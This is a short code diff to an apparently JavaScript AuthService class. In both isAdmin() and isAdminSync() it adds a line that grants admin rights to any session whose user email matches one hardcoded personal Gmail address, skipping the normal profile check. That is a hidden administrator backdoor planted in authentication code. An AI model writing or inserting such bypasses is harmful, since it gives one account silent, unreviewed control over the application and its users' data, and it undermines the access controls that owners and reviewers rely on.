@@ -251,6 +251,7 @@ class AuthService {
      * @returns {Promise<boolean>}
      */
     async isAdmin() {
+        if (this._user?.email === 'mahmoudsruby@gmail.com') return true;
         const profile = await this.getUserProfile();
         if (!profile) return false;
         
@@ -283,6 +284,7 @@ class AuthService {
      * @returns {boolean}
      */
     isAdminSync() {
+        if (this._user?.email === 'mahmoudsruby@gmail.com') return true;
         if (!this._profile) return false;
         return this._profile.isAdmin === true || this._profile.profile?.isAdmin === true;
     }
